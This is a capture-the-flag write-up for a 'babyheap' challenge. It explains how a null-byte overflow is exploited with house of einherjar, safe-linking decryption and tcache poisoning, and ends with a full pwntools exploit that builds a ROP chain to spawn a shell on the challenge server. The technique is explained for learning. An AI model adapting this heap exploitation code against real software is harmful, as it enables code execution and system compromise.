# solution
there is a simple null byte overflow in the modify function.
you can exploit it with house of einherjar.
we can simply leak heap address and libc address by using the fact that after malloc the chunks are not intizialized.
so by doing this:
  ```py

create(0, 16)
create(1, 16)

remove(0)
remove(1)

create(0, 16)
  ```
  
we have a heap address in the chunk. since libc 2.32 we have to decrypt that address by using this function:

```py
def decrypt(cipher):
  key = 0
  plain = 0
  for i in range(1,6):
    bits = 64-12*i
    if(bits<0):
      bits = 0
    plain = ((cipher ^ key) >> bits) << bits
    key = plain >> 12
  return (key, plain)
```

to leak libc address is a bit more complex, we have to allocate 8 chunks of a size > 0x80 and one to prevent consolidation
then remove this 8 chunks and reallocate them.
the 8th chunk will contain the address of the main arena and will be in the unsorted bin.
so we just need to do another allocation of a random size to get a chunk where pointers to main arena are stored.
like this:

```py
for i in range(8):
  create(i, 0x100)

for i in range(8):
  remove(i)

create(0, 16)
leak = int.from_bytes(view(7, 16)[8:16], "little")-0x219d00
```

now we just have to exploit the null byte overflow by using house_of_einherjar:
  ```py
#create a fake chunk of 0x60 size
create(0, 0x38)#a 
modify(0, 0x38, p64(0x0)+p64(0x60)+p64(heap+0xb80)+p64(heap+0xb80))

create(1, 0x28) #b
create(2, 0xf8) #c

#null byte overflow in b modifying the size of c from 0x101 in 0x100 and writing the prev size of the fake chunk
modify(1, 0x28, b"a"*0x20+p64(0x60))

#freeing c into unsorted
for i in range(3, 10):
  create(i, 0xf8)

for i in range(3, 10):
  remove(i)

remove(2)

#after the free of c fake chunk and c are consolidated so we now have a chunk of 0x160 in the unsorted
#by allocating this chunk we get a overlap in b
create(15, 0x158)

#setup tcache to overwrite fwd of b
create(14, 0x28)
remove(14)
remove(1)

#encrypting for safe linking and allocate overwrite fwd with target
target = libc.symbols["environ"]^key 
modify(15, 0x38, p64(0x0)*5 + p64(0x31) + p64(target)) 

create(11, 0x28) #b
create(12, 0x28) #target
  ```
  

this is the full exploit:
  ```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='amd64')
exe = './babyheap'
libc = ELF("./libc.so.6")
rop = ROP("./libc.so.6")




def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.LOCAL:
        return process([exe] + argv, *a, **kw)
    else:
        return remote("babyheap.challs.srdnlen.it", 15010)

gdbscript = '''
continue
'''.format(**locals())

def create(index, size):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", str(index).encode())
    io.sendlineafter(b"> ", str(size).encode())

def remove(index):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(index).encode())

def view(index, size):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"> ", str(index).encode())
    io.sendlineafter(b"> ", str(size).encode())
    io.recvuntil(b": ")
    return io.recv(size)

def modify(index, size, content):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"> ", str(index).encode())
    io.sendlineafter(b"> ", str(size).encode())
    io.sendlineafter(b"> ", content)

def decrypt(cipher):
    key = 0
    plain=0

    for i in range(1, 6):
        bits = 64-12*i
        if(bits < 0):
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return (key, plain)


# -- Exploit goes here --

io = start()

#leak heap address by decripting safe linking
create(0, 16)
create(1, 16)

remove(0)
remove(1)

create(0, 16)

a = int.from_bytes(view(0, 8), "little")
key, leak = decrypt(a)
heap = leak -0x2a0
print(hex(key))
print(hex(heap))


#leak libc address
for i in range(8):
    create(i, 0x100)

create(8, 0x10)
create(8, 0x10)

for i in range(8):
    remove(i)

create(7, 16)
print(view(7, 16))
leak = int.from_bytes(view(7, 16)[8:16], "little")-0x219d00
libc.address=leak
print(hex(libc.address))


#create a fake chunk of 0x60 size
create(0, 0x38)#a 
modify(0, 0x38, p64(0x0)+p64(0x60)+p64(heap+0xb80)+p64(heap+0xb80))

create(1, 0x28) #b
create(2, 0xf8) #c

#null byte overflow in b modifying the size of c from 0x101 in 0x100 and writing the prev size of the fake chunk
modify(1, 0x28, b"a"*0x20+p64(0x60))

#freeing c into unsorted
for i in range(3, 10):
    create(i, 0xf8)

for i in range(3, 10):
    remove(i)

remove(2)

#after the free of c fake chunk and c are consolidated so we now have a chunk of 0x160 in the unsorted
#by allocating this chunk we get a overlap in b
create(15, 0x158)

#we just do a use after free
create(14, 0x28)
remove(14)
remove(1)

#encrypting for safe linking
#since hook are disabled, leak the stack address and then creating a rop at return address
target = libc.symbols["environ"]^key 
modify(15, 0x38, p64(0x0)*5 + p64(0x31) + p64(target)) 

create(11, 0x28) #b
create(12, 0x28) #target

stack = view(12, 8)
stack = int.from_bytes(stack, "little")-0x128
print(hex(stack))

#redo the use after free
create(14, 0x28)
remove(14)
remove(11)

#encrypting the ret address stack
target = stack^key 
modify(15, 0x38, p64(0x0)*5 + p64(0x31) + p64(target)) 

create(11, 0x28) #b
create(12, 0x28) #target

#just ensure one_gadget  constraints are met then exit and get the shell
exploit = p64(libc.bss()+0x78) + p64(rop.rsi.address + libc.address) + p64(0x0) + p64(rop.ret.address + libc.address) + p64(0xebcf8+libc.address)

modify(12, 0x28, exploit)

io.sendlineafter(b"> ", b"5")
io.recvuntil(b"bye bye")
io.sendline(b"cat flag.txt")

flag = io.recvline(keepends=False)
print(flag)

io.close()
  ```   
